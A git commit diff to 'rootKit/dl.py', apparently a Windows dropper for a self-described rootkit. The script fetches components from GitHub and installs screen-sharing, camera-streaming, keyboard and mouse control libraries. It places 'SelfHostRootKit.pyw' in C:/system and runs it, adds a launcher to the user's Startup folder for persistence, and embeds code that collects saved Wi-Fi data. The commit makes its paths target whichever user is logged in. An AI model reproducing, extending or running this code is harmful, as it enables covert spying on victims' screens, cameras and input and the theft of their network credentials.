9372a7b94eb1d4a93edb1b307561943375133c93
N0SAFE <77668394+N0SAFE@users.noreply.github.com>
2021-09-03 22:29:37 +0200

    Update dl.py

--- rootKit/dl.py
+++ rootKit/dl.py
@@ -1,16 +1,23 @@
-# ! create file in C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
+# ! create file in C:/Users/%user%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
 from os import remove, chdir, system, getcwd, path
 from shutil import move, rmtree
 from time import sleep
 from zipfile import ZipFile
-from requests import get
 from subprocess import Popen, getoutput
+import getpass
+
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
+try:
+    from requests import get
+except:
+    system("pip install requests")
+    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
+    exit()
 try:
     import easyimporting
 except:
     system("pip install easyimporting")
-    system('dl.py')
+    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
     exit()
 def unzipfile(file=".zip"):
     # open ZIP file in read mode
@@ -36,15 +43,18 @@ try:
 except:
     dir = "whl-main"
     downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
-    print(getoutput("py -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
+    print(getoutput("python -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
     rmtree("whl-main")
-    print(getoutput("py -m pip install vidstream"))
+    print("installation de vidtream veuillez attendre")
+    print(getoutput("python -m pip install vidstream"))
+    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
+    exit()
 from vidstream import ScreenShareClient, CameraClient
 try:
-    import pyautogui, socket, lib_platform, pyaudio
+    import pyautogui, socket, lib_platform, pyaudio, keyboard, mouse, colored
 except:
-    easyimporting.importing("pyautogui lib_platform")
-    system('dl.py')
+    easyimporting.importing("pyautogui lib_platform keyboard mouse colored")
+    system("start "+path.realpath(__file__)[:-len(path.basename(__file__))-1]+"\\dl.py")
     exit()
 with open('lancement.pyw', 'w', encoding="utf-8") as file:
     file.write("""
@@ -67,6 +77,7 @@ except:
 move('SelfHostRootKit.pyw', 'C:\system')
 chdir("C:\system")
 Popen("start SelfHostRootKit.pyw", shell=True)
+
 def getWifi():
     import subprocess
     ret = ''
@@ -80,13 +91,14 @@ def getWifi():
         except:
             pass
     return ret.replace('\\n', '').replace('\\r', '')
+
 with open('C:/system/test', 'w') as file:
     file.write(getWifi())""")
 try:
-    remove("C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
+    remove("C:/Users/"+getpass.getuser()+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
 except:
     pass
-move('lancement.pyw', 'C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
-chdir('C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+
+move('lancement.pyw', 'C:/Users/'+getpass.getuser()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+chdir('C:/Users/'+getpass.getuser()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 system('start lancement.pyw')
-remove(__file__)
